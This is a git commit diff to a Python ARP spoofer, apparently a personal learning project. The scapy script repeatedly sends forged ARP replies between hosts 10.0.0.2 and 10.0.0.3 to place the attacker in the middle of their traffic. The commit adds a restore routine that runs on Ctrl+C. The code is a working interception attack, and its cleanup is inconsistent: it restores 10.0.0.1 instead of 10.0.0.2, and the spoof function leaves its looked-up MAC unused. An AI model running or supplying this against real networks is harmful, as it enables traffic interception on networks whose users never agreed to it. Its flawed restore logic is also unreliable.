55ff64af03caed167680e295c18ce68d193fd1c4
Tony Nguyen <69164218+Tnguye98@users.noreply.github.com>
2022-07-26 15:28:35 -0400

    Update arpSpoofer.py
    Completed an ARP spoofer in python.

--- Python/arpSpoofer.py
+++ Python/arpSpoofer.py
@@ -11,15 +11,18 @@ def getMAC(ip):
 
 	return answeredList[0][1].hwsrc
 
-
 def spoof(targetIP, spoofIP):
 	targetMAC = getMAC(targetIP)
 	packet = scapy.ARP(op = 2, pdst = targetIP, hwdst = "", psrc = spoofIP)
 	scapy.send(packet, verbose = False)
 
+def restore(destinationIP, sourceIP):
+	destinationMAC, sourceMAC = getMAC(destinationIP), getMAC(sourceIP)
+	packet = scapy.ARP(op = 2, pdst = destinationIP, hwdst = destinationMAC, psrc = sourceIP, hwsrc = sourceMAC)
+	scapy.send(packet, count = 4, verbose = False)
 
-sentPacketsCount = 0
 try:
+	sentPacketsCount = 0
 	while True:
 		spoof("10.0.0.2", "10.0.0.3")
 		spoof("10.0.0.3", "10.0.0.2")
@@ -27,4 +30,6 @@ try:
 		print("\r[+] Packets sent: " + str(sentPacketsCount), end = "")
 		time.sleep(2)
 except KeyboardInterrupt:
-	print("[+] Detected CTRL + C . . . . Quitting.")
+	print("[+] Detected CTRL + C . . . . Resetting ARP tables. ")
+	restore("10.0.0.3", "10.0.0.1")
+	restore("10.0.0.1", "10.0.0.3")
